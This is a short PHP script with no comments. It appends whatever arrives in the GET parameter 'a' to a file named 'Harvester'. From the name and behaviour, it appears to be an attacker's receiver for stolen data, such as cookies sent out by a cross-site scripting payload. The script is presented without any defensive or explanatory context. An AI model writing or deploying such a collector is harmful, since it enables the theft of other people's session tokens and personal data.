<?php
 $file = 'Harvester';
 file_put_contents($file, print_r($_GET['a'], true), FILE_APPEND);
 ?>